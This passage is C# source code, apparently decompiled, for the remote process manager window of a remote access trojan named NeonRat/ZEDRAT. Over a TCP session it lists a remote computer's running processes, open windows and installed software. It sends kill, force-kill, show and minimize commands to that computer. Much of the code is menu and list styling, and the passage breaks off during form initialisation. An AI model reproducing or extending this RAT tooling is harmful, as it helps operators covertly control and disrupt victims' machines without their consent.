using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Remote_Process;
using Sockets;
using ZEDRAT.Module;
using ZEDRAT.TCP;
using ZEDRatApp.Properties;

namespace NeonRat.Forms
{
	public class Remote_Process : Form
	{
		public class ColorConfig
		{
			private Color _fontcolor = Color.White;

			private Color _marginstartcolor = Color.FromArgb(40, 40, 40);

			private Color _marginendcolor = Color.FromArgb(40, 40, 40);

			private Color _dropdownitembackcolor = Color.FromArgb(40, 40, 40);

			private Color _dropdownitemstartcolor = Color.FromArgb(70, 70, 70);

			private Color _dorpdownitemendcolor = Color.FromArgb(70, 70, 70);

			private Color _menuitemstartcolor = Color.FromArgb(70, 70, 70);

			private Color _menuitemendcolor = Color.FromArgb(40, 40, 40);

			private Color _separatorcolor = Color.FromArgb(40, 40, 40);

			private Color _mainmenubackcolor = Color.FromArgb(40, 40, 40);

			private Color _mainmenustartcolor = Color.FromArgb(40, 40, 40);

			private Color _mainmenuendcolor = Color.FromArgb(40, 40, 40);

			private Color _dropdownborder = Color.FromArgb(40, 40, 40);

			public Color FontColor
			{
				get
				{
					return this._fontcolor;
				}
				set
				{
					this._fontcolor = value;
				}
			}

			public Color MarginStartColor
			{
				get
				{
					return this._marginstartcolor;
				}
				set
				{
					this._marginstartcolor = value;
				}
			}

			public Color MarginEndColor
			{
				get
				{
					return this._marginendcolor;
				}
				set
				{
					this._marginendcolor = value;
				}
			}

			public Color DropDownItemBackColor
			{
				get
				{
					return this._dropdownitembackcolor;
				}
				set
				{
					this._dropdownitembackcolor = value;
				}
			}

			public Color DropDownItemStartColor
			{
				get
				{
					return this._dropdownitemstartcolor;
				}
				set
				{
					this._dropdownitemstartcolor = value;
				}
			}

			public Color DropDownItemEndColor
			{
				get
				{
					return this._dorpdownitemendcolor;
				}
				set
				{
					this._dorpdownitemendcolor = value;
				}
			}

			public Color MenuItemStartColor
			{
				get
				{
					return this._menuitemstartcolor;
				}
				set
				{
					this._menuitemstartcolor = value;
				}
			}

			public Color MenuItemEndColor
			{
				get
				{
					return this._menuitemendcolor;
				}
				set
				{
					this._menuitemendcolor = value;
				}
			}

			public Color SeparatorColor
			{
				get
				{
					return this._separatorcolor;
				}
				set
				{
					this._separatorcolor = value;
				}
			}

			public Color MainMenuBackColor
			{
				get
				{
					return this._mainmenubackcolor;
				}
				set
				{
					this._mainmenubackcolor = value;
				}
			}

			public Color MainMenuStartColor
			{
				get
				{
					return this._mainmenustartcolor;
				}
				set
				{
					this._mainmenustartcolor = value;
				}
			}

			public Color MainMenuEndColor
			{
				get
				{
					return this._mainmenuendcolor;
				}
				set
				{
					this._mainmenuendcolor = value;
				}
			}

			public Color DropDownBorder
			{
				get
				{
					return this._dropdownborder;
				}
				set
				{
					this._dropdownborder = value;
				}
			}
		}

		public class MyMenuRender : ToolStripProfessionalRenderer
		{
			private ColorConfig colorconfig = new ColorConfig();

			protected override void OnRenderToolStripBackground(ToolStripRenderEventArgs e)
			{
				e.ToolStrip.ForeColor = this.colorconfig.FontColor;
				if (e.ToolStrip is ToolStripDropDown)
				{
					using (SolidBrush brush = new SolidBrush(this.colorconfig.DropDownItemBackColor))
					{
						e.Graphics.FillRectangle(brush, e.AffectedBounds);
						return;
					}
				}
				if (e.ToolStrip is MenuStrip)
				{
					Blend blend = new Blend();
					float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
					float[] factors = new float[5] { 0f, 0.5f, 0.9f, 0.5f, 0f };
					blend.Positions = positions;
					blend.Factors = factors;
					this.FillLineGradient(e.Graphics, e.AffectedBounds, this.colorconfig.MainMenuStartColor, this.colorconfig.MainMenuEndColor, 90f, blend);
				}
				else
				{
					base.OnRenderToolStripBackground(e);
				}
			}

			protected override void OnRenderImageMargin(ToolStripRenderEventArgs e)
			{
				this.FillLineGradient(e.Graphics, e.AffectedBounds, this.colorconfig.MarginStartColor, this.colorconfig.MarginEndColor, 0f, null);
			}

			protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
			{
				if (e.ToolStrip is MenuStrip)
				{
					if (e.Item.Selected || e.Item.Pressed)
					{
						Blend blend = new Blend();
						float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
						float[] factors = new float[5] { 0f, 0.5f, 1f, 0.5f, 0f };
						blend.Positions = positions;
						blend.Factors = factors;
						this.FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), this.colorconfig.MenuItemStartColor, this.colorconfig.MenuItemEndColor, 90f, blend);
					}
					else
					{
						base.OnRenderMenuItemBackground(e);
					}
				}
				else if (!(e.ToolStrip is ToolStripDropDown))
				{
					base.OnRenderMenuItemBackground(e);
				}
				else if (e.Item.Selected)
				{
					this.FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), this.colorconfig.DropDownItemStartColor, this.colorconfig.DropDownItemEndColor, 90f, null);
				}
			}

			protected override void OnRenderSeparator(ToolStripSeparatorRenderEventArgs e)
			{
				using Pen pen = new Pen(this.colorconfig.DropDownBorder);
				e.Graphics.DrawLine(pen, 0, 2, e.Item.Width, 2);
			}

			protected override void OnRenderToolStripBorder(ToolStripRenderEventArgs e)
			{
				if (e.ToolStrip is ToolStripDropDown)
				{
					using (Pen pen = new Pen(this.colorconfig.DropDownBorder))
					{
						e.Graphics.DrawRectangle(pen, new Rectangle(0, 0, e.AffectedBounds.Width - 1, e.AffectedBounds.Height - 1));
						return;
					}
				}
				base.OnRenderToolStripBorder(e);
			}

			protected override void OnRenderArrow(ToolStripArrowRenderEventArgs e)
			{
				e.ArrowColor = Color.Red;
				base.OnRenderArrow(e);
			}

			private void FillLineGradient(Graphics g, Rectangle rect, Color startcolor, Color endcolor, float angle, Blend blend)
			{
				using LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rect, startcolor, endcolor, angle);
				if (blend != null)
				{
					linearGradientBrush.Blend = blend;
				}
				using GraphicsPath graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(rect);
				g.SmoothingMode = SmoothingMode.AntiAlias;
				g.FillPath(linearGradientBrush, graphicsPath);
			}
		}

		public object ObjStatus = new object();

		public bool Statusing;

		public Point formPoint;

		public bool formMove;

		public TcpClientSession _tcs;

		public bool SortOrder;

		public Remote_Process_Manager _rpm;

		public Bitmap obj = Resources.ResourceManager.GetObject("UnknownExe") as Bitmap;

		private IContainer components;

		private Label label1;

		private Panel panel2;

		private ListView listView1;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem refreshToolStripMenuItem;

		private ToolStripMenuItem killToolStripMenuItem;

		private ToolTip toolTip1;

		private Label label2;

		private Label label3;

		private ListView listView2;

		private ImageList imageList1;

		private ContextMenuStrip contextMenuStrip3;

		private ToolStripMenuItem 显示ToolStripMenuItem;

		private ToolStripMenuItem 最小化ToolStripMenuItem;

		private ToolStripMenuItem 结束进程ToolStripMenuItem;

		private ToolStripMenuItem 刷新ToolStripMenuItem;

		private ImageList imageList2;

		private PictureBox pictureBox1;

		private LinkLabel linkLabel1;

		private LinkLabel linkLabel2;

		private PictureBox pictureBox2;

		private LinkLabel linkLabel3;

		private PictureBox pictureBox3;

		private ListView listView3;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader6;

		private ContextMenuStrip contextMenuStrip2;

		private ToolStripMenuItem refreshToolStripMenuItem1;

		private PictureBox pictureBox4;

		private ToolStripMenuItem forceKillToolStripMenuItem;

		private BunifuIconButton bunifuIconButton3;

		private BunifuIconButton bunifuIconButton1;

		private BunifuIconButton bunifuIconButton6;

		private MetroSetControlBox metroSetControlBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator2;

		private BunifuSeparator bunifuSeparator4;

		private BunifuSeparator bunifuSeparator3;

		public Remote_Process(string FormText, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.label1.Text = FormText;
			this._tcs = tcs;
			this._rpm = new Remote_Process_Manager(this._tcs);
		}

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Process.ReleaseCapture();
			Remote_Process.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(40, 40, 40));
			using SolidBrush brush2 = new SolidBrush(Color.FromArgb(142, 188, 0));
			e.DrawBackground();
			e.Graphics.FillRectangle(brush, e.Bounds);
			Font font = new Font("Segoe UI", 9f, FontStyle.Bold);
			e.Graphics.DrawString(e.Header.Text, font, brush2, e.Bounds);
		}

		private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(190, 190, 190));
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 8f, FontStyle.Regular), new Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17));
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void button2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			this.formPoint = default(Point);
			if (e.Button == MouseButtons.Left)
			{
				this.formPoint = new Point(-e.X - SystemInformation.FrameBorderSize.Width, -e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height);
				this.formMove = true;
			}
		}

		private void panel1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.formMove)
			{
				Point mousePosition = Control.MousePosition;
				mousePosition.Offset(this.formPoint.X, this.formPoint.Y);
				base.Location = mousePosition;
			}
		}

		private void panel1_MouseUp(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.formMove = false;
			}
		}

		private void listView1_DrawColumnHeader_1(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(40, 40, 40));
			using SolidBrush brush2 = new SolidBrush(Color.FromArgb(142, 188, 0));
			e.DrawBackground();
			e.Graphics.FillRectangle(brush, e.Bounds);
			Font font = new Font("Segoe UI", 9f, FontStyle.Bold);
			e.Graphics.DrawString(e.Header.Text, font, brush2, e.Bounds);
		}

		private void listView1_DrawItem_1(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void listView1_DrawSubItem_1(object sender, DrawListViewSubItemEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(190, 190, 190));
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 8f, FontStyle.Regular), new Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17));
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void SetLastColumnWidth1()
		{
			this.listView1.Columns[this.listView1.Columns.Count - 1].Width = -2;
		}

		private void SetLastColumnWidth2()
		{
			this.listView3.Columns[this.listView3.Columns.Count - 1].Width = -2;
		}

		private void Remote_Process_Load(object sender, EventArgs e)
		{
			this.SetLastColumnWidth1();
			this.listView1.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.listView1.View = View.Details;
			this.listView1.HideSelection = false;
			this.listView1.OwnerDraw = true;
			this.listView1.GridLines = false;
			this.listView1.BackColor = Color.FromArgb(9, 8, 13);
			this.listView1.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush2 = new SolidBrush(Color.FromArgb(226, 28, 71));
				args.Graphics.FillRectangle(brush2, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.listView1.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.listView1.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.SetLastColumnWidth2();
			this.listView3.Layout += delegate
			{
				this.SetLastColumnWidth2();
			};
			this.listView3.View = View.Details;
			this.listView3.HideSelection = false;
			this.listView3.OwnerDraw = true;
			this.listView3.GridLines = false;
			this.listView3.BackColor = Color.FromArgb(9, 8, 13);
			this.listView3.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(226, 28, 71));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.listView3.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.listView3.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this._tcs._Idispatchar.Register(DataType.RemoteProcessType, new Action<TcpClientSession, byte[]>(this._rpm.RemoteProcessExecute));
			this._rpm._FormExecute = new Action<string, object>(UpdateRemoteProcess_Form);
		}

		public void UpdateRemoteProcess_Form(string DateType, object ob)
		{
			try
			{
				lock (this.ObjStatus)
				{
					this.Statusing = false;
				}
				switch (DateType)
				{
				case "SetupRefresh":
					base.Invoke((MethodInvoker)delegate
					{
						ImageList imageList = new ImageList
						{
							ColorDepth = ColorDepth.Depth32Bit,
							ImageSize = new Size(16, 16)
						};
						this.listView3.Items.Clear();
						this.listView3.SmallImageList = imageList;
						List<RemoteProcessList> obj = ob as List<RemoteProcessList>;
						int num = 0;
						foreach (RemoteProcessList item in obj)
						{
							ListViewItem value = new ListViewItem
							{
								Text = item.ProcessName,
								SubItems = { item.CommandLine },
								ImageIndex = num++
							};
							imageList.Images.Add(item.ProcessIcon ?? this.obj);
							this.listView3.Items.Add(value);
						}
						this.label3.Text = "Status : The operation was successful.";
						this.label2.Text = "Setup Software :[" + num + " ]";
					});
					break;
				case "WindowRefresh":
					base.Invoke((MethodInvoker)delegate
					{
						RemoteProcessList remoteProcessList = ob as RemoteProcessList;
						ListViewItem value2 = new ListViewItem
						{
							Name = remoteProcessList.Pid,
							Text = remoteProcessList.ProcessName,
							ImageIndex = this.imageList1.Images.Count
						};
						this.imageList1.Images.Add(remoteProcessList.ProcessIcon ?? this.obj);
						this.listView2.Items.Add(value2);
						this.label3.Text = "Status : The operation was successful.";
						this.label2.Text = "Window :[" + this.listView2.Items.Count + " ]";
					});
					break;
				case "Refresh":
					base.Invoke((MethodInvoker)delegate
					{
						ImageList imageList2 = new ImageList
						{
							ColorDepth = ColorDepth.Depth32Bit,
							ImageSize = new Size(16, 16)
						};
						this.listView1.Items.Clear();
						this.listView1.SmallImageList = imageList2;
						List<RemoteProcessList> obj2 = ob as List<RemoteProcessList>;
						int num2 = 0;
						foreach (RemoteProcessList item2 in obj2)
						{
							ListViewItem value3 = new ListViewItem
							{
								Text = item2.ProcessName,
								SubItems = { item2.Pid, item2.Integrity, item2.CommandLine },
								ImageIndex = num2++
							};
							imageList2.Images.Add(item2.ProcessIcon ?? this.obj);
							this.listView1.Items.Add(value3);
						}
						this.label3.Text = "Status : The operation was successful.";
						this.label2.Text = "Process :[" + num2 + " ]";
					});
					break;
				case "Status":
					base.Invoke((MethodInvoker)delegate
					{
						this.label3.Text = "Status :" + ob;
					});
					break;
				}
			}
			catch (Exception ex2)
			{
				Exception ex = ex2;
				base.Invoke((MethodInvoker)delegate
				{
					this.label3.Text = "Status :" + ex.Message;
				});
			}
		}

		private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == 0)
			{
				this.listView1.Sorting = (this.SortOrder ? System.Windows.Forms.SortOrder.Ascending : System.Windows.Forms.SortOrder.Descending);
				this.SortOrder = !this.SortOrder;
			}
		}

		private void listView1_ItemMouseHover(object sender, ListViewItemMouseHoverEventArgs e)
		{
			ToolTip toolTip = new ToolTip();
			toolTip.ToolTipIcon = ToolTipIcon.Info;
			toolTip.AutoPopDelay = 10000;
			toolTip.SetToolTip(caption: "Process Name : " + e.Item.SubItems[0].Text + "\r\nPID : " + e.Item.SubItems[1].Text + "\r\nIntegrity : " + e.Item.SubItems[2].Text + "\r\nCommand Line : " + e.Item.SubItems[3].Text + "\r\n", control: e.Item.ListView);
		}

		private void killToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 0)
			{
				return;
			}
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("Kill", BitConverter.GetBytes(int.Parse(this.listView1.SelectedItems[0].SubItems[1].Text)));
		}

		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("Refresh", Encoding.UTF8.GetBytes("hello"));
		}

		private void 刷新ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.listView2.Items.Clear();
			this.imageList1.Images.Clear();
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("WindowRefresh", Encoding.UTF8.GetBytes("hello"));
		}

		private void 显示ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView2.SelectedItems.Count == 0)
			{
				return;
			}
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("show", Encoding.UTF8.GetBytes(this.listView2.SelectedItems[0].SubItems[0].Text));
		}

		private void 最小化ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView2.SelectedItems.Count == 0)
			{
				return;
			}
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("minimize", Encoding.UTF8.GetBytes(this.listView2.SelectedItems[0].SubItems[0].Text));
		}

		private void 结束ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView2.SelectedItems.Count == 0)
			{
				return;
			}
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this._rpm.Remote_Process_Send("Kill", BitConverter.GetBytes(int.Parse(this.listView2.SelectedItems[0].SubItems[0].Name)));
		}

		private void Remote_Process_FormClosed(object sender, FormClosedEventArgs e)
		{
			this._tcs?._Idispatchar?.Unregister(DataType.RemoteProcessType);
			this._rpm?.destroy();
			this.obj?.Dispose();
			this.obj = null;
			this._tcs = null;
			this._rpm = null;
			GC.Collect();
		}

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			this.listView1.Show();
			this.listView2.Visible = false;
			this.listView3.Visible = false;
		}

		private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			this.listView1.Visible = false;
			this.listView2.Show();
			this.listView3.Visible = false;
		}

		private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			this.listView1.Visible = false;
			this.listView2.Visible = false;
			this.listView3.Show();
		}

		private void listView3_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			this.listView1_DrawColumnHeader(sender, e);
		}

		private void listView3_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			this.listView1_DrawItem(sender, e);
		}

		private void listView3_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			this.listView1_DrawSubItem(sender, e);
		}

		private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("SetupRefresh", Encoding.UTF8.GetBytes(""));
		}

		private void forceKillToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 0 || MessageBox.Show("Are you sure you force the end? (requires high privileges)", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes)
			{
				return;
			}
			lock (this.ObjStatus)
			{
				if (this.Statusing)
				{
					return;
				}
				this.Statusing = true;
			}
			this.label3.Text = "Status : Waiting for result....";
			this._rpm.Remote_Process_Send("Force_Kill", BitConverter.GetBytes(int.Parse(this.listView1.SelectedItems[0].SubItems[1].Text)));
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void Remote_Process_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Process.ReleaseCapture();
			Remote_Process.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void linkLabel1_LinkClicked(object sender, EventArgs e)
		{
			this.listView1.Show();
			this.listView2.Visible = false;
			this.listView3.Visible = false;
		}

		private void bunifuIconButton3_Click(object sender, EventArgs e)
		{
			this.listView1.Visible = false;
			this.listView2.Show();
			this.listView3.Visible = false;
		}

		private void bunifuIconButton1_Click(object sender, EventArgs e)
		{
			this.listView1.Visible = false;
			this.listView2.Visible = false;
			this.listView3.Show();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NeonRat.Forms.Remote_Process));
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.pictureBox4 = new System.Windows.Forms.PictureBox();
			this.label1 = new System.Windows.Forms.Label();
			this.panel2 = new System.Windows.Forms.Panel();
			this.bunifuIconButton3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton1 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.linkLabel3 = new System.Windows.Forms.LinkLabel();
			this.linkLabel2 = new System.Windows.Forms.LinkLabel();
			this.linkLabel1 = new System.Windows.Forms.LinkLabel();
			this.listView1 = new System.Windows.Forms.ListView();
			this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
			this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.forceKillToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.label2 = new System.Windows.Forms.Label();
			this.listView3 = new System.Windows.Forms.ListView();
			this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader6 = new System.Windows.Forms.ColumnHeader();
			this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.refreshToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.listView2 = new System.Windows.Forms.ListView();
			this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.刷新ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.显示ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.最小化ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.结束进程ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.imageList1 = new System.Windows.Forms.ImageList(this.components);
			this.pictureBox3 = new System.Windows.Forms.PictureBox();
			this.pictureBox2 = new System.Windows.Forms.PictureBox();
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
			this.label3 = new System.Windows.Forms.Label();
			this.imageList2 = new System.Windows.Forms.ImageList(this.components);
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator3 = new Bunifu.UI.WinForms.BunifuSeparator();
			((System.ComponentModel.ISupportInitialize)this.pictureBox4).BeginInit();
			this.panel2.SuspendLayout();
			this.contextMenuStrip1.SuspendLayout();
			this.contextMenuStrip2.SuspendLayout();
			this.contextMenuStrip3.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(1043, 12);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 158;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.pictureBox4.Image = (System.Drawing.Image)resources.GetObject("pictureBox4.Image");
			this.pictureBox4.Location = new System.Drawing.Point(26, 12);
			this.pictureBox4.Name = "pictureBox4";
			this.pictureBox4.Size = new System.Drawing.Size(29, 26);
			this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox4.TabIndex = 4;
			this.pictureBox4.TabStop = false;
			this.label1.AutoSize = true;
			this.label1.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.label1.Location = new System.Drawing.Point(61, 17);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(57, 21);
			this.label1.TabIndex = 3;
			this.label1.Text = "label1";
			this.panel2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.panel2.Controls.Add(this.bunifuIconButton3);
			this.panel2.Controls.Add(this.bunifuIconButton1);
			this.panel2.Controls.Add(this.bunifuIconButton6);
			this.panel2.Controls.Add(this.linkLabel3);
			this.panel2.Controls.Add(this.linkLabel2);
			this.panel2.Controls.Add(this.linkLabel1);
			this.panel2.Controls.Add(this.listView1);
			this.panel2.Controls.Add(this.label2);
			this.panel2.Controls.Add(this.listView3);
			this.panel2.Controls.Add(this.listView2);
			this.panel2.Location = new System.Drawing.Point(23, 62);
			this.panel2.Name = "panel2";
